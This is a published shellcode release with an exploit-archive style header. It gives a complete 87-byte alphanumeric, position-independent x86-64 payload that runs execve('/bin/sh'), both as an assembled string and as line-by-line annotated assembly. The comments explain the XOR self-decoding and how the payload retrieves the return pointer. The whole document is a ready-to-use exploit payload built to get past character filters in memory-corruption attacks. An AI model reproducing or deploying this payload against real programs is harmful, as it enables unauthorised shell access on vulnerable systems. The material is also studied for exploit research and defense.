#Title: Position independent & Alphanumeric 64-bit execve("/bin/sh\0",NULL,NULL); (87 bytes)
#Author: Breaking.Technology
#Date: 06 November 2014
#Vendor Homepage: http://breaking.technology
#Version: x86-64 platforms
#Classification: 64 bit shellcode
#Shellcode: http://breaking.technology/shellcode/alpha64-binsh.txt

#    Position independent & Alphanumeric 64-bit execve("/bin/sh\0",NULL,NULL); (87 bytes)
# This shellcode will successfully execute every time as long as it is returned to.
#                        (c) 2014 Breaking Technology, Inc.
#                           http://breaking.technology/
#
# Assembled (87 bytes):
# XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V
#
# Assembly:
# user@host $ as alpha64-binsh.s -o alpha64-binsh.o ; strings alpha64-binsh.o
.section .data
.section .text
.globl _start

_start:                     # "XX"
  pop %rax                  # 'X' add $0x8, %rsp  ; so we dont overwrite the return pointer
  pop %rax                  # 'X' add $0x8, %rsp  ; so we dont overwrite the return pointer

prepare_ff:                 # "j0TYX45Pk13"
  push $0x30                # 'j0'
  push %rsp                 # 'T'
  pop %rcx                  # 'Y'   %rcx points to $0x30
  pop %rax                  # 'X'   %rax   = 0x30
  xor $0x35, %al            # '45'  %rax   = 0x05
  push %rax                 # 'P'   (%rcx) = 0x05
  imul $0x33, (%rcx), %esi  # 'k13' %esi = 0x000000ff

prepare_f8:                 # "VX4047"
  # mov %rsi, %rax
  push %rsi                 # 'V'
  pop %rax                  # 'X'    %rax = %rsi = 0x000000ff

  # mov $0xf8, %al
  xor $0x30, %al            # '40'
  xor $0x37, %al            # '47'   %rax = 0x000000f8

write_negative_8:           # "3At1At1qu1qv1qw"
  # mov %eax, 0x74(%rcx)
  xor 0x74(%rcx), %eax      # '3At'
  xor %eax, 0x74(%rcx)      # '1At' 0xf8

  # mov %sil, 0x75 - 0x77 + rcx
  xor %esi, 0x75(%rcx)      # '1qu' 0xff
  xor %esi, 0x76(%rcx)      # '1qv' 0xff
  xor %esi, 0x77(%rcx)      # '1qw' 0xff

  # -8 is now on the stack as a 32-bit dword
  # at 0x74(%rcx)

read_negative_8:            # "Hcyt"
  # move long (dword) to signed quadword
  # mov -8, %rdi
  movslq 0x74(%rcx), %rdi   # 'Hcyt' %rdi is now -0x8 ( 0xfffffffffffffff8 )

get_return_pointer:         # "14yH34y"
  # mov -0x10(%rcx), %rsi   <--- THIS IS OUR RETURN POINTER / LOCATION OF short_pc_rsi
  # OR IN DECIMAL:
  # mov -16(%rcx), %rsi
  xor %esi, (%rcx, %rdi, 2) # '14y'
  xor (%rcx, %rdi, 2), %rsi # 'H34y'

prepare_key:                # "hj5XVX"
  # put the xor key into %eax
  push $0x5658356a          # 'hj5XV' pushed backwards because x86 stack.
  pop %rax                  # 'X'

decode_encoded_code:        # "1FK"
  xor %eax, 0x4b(%rsi)      # '1FK'  encoded_code       ; pops & syscall decoded

decode_encoded_data:        # "1FSH3FO"
  xor %eax, 0x53(%rsi)      # '1FS'  encoded_data + 4  ; "/sh\0" decoded
  xor 0x4f(%rsi), %rax      # 'H3FO' encoded_data      ; "/bin/sh\0" now in %rax

begin_stack_setup:          # "PT"
  push %rax                 # 'P' push "/bin/sh\0"
  push %rsp                 # 'T' push pointer to /bin/sh


zero_rax:                   # "j0X40"
  # xor %rax, %rax
  push $0x30                # 'j0'
  pop %rax                  # 'X'
  xor $0x30, %al            # '40' %rax is NULL

end_stack_setup:            # "PP"
  push %rax                 # 'P' push NULL
  push %rax                 # 'P' push NULL


mov_3b_al:                  # "4u4N"
  # mov $0x3b, %al
  xor $0x75, %al            # '4u'
  xor $0x4e, %al            # '4N' %al = 0x4e xor 0x75 =  $0x3b
                            #            this is for syscall ^
begin_stack_run:            # "Z"
  pop %rdx                  # 'Z' mov $0x00, %rdx ; %rdx = NULL


encoded_code:               # "4jWS"
                            #  0x34 0x6a 0x57 0x53
                            # AFTER XOR MAGIC:
  .byte 0x34                # "\x5e" pop %rsi     ; %rsi = NULL
  .byte 0x6a                # "\x5f" pop %rdi     ; %rdi = pointer to "/bin/sh\0"
  .byte 0x57                # "\x0f"
  .byte 0x53                # "\x05" syscall      ; execve("/bin/sh\0",NULL,NULL);

  # syscall(%rax) = function(%rdi,%rsi,%rdx);
  # syscall(0x3b) = execve("/bin/sh\0",NULL,NULL);


encoded_data:               # "EW18EF0V" turns into "/bin/sh\0"
                            # 0x45 0x57 0x31 0x38 0x45 0x46 0x30 0x56
                            # AFTER XOR MAGIC:
  .byte 0x45                #  /
  .byte 0x57                #  b
  .byte 0x31                #  i
  .byte 0x38                #  n
  .byte 0x45                #  /
  .byte 0x46                #  s
  .byte 0x30                #  h
  .byte 0x56                #  \0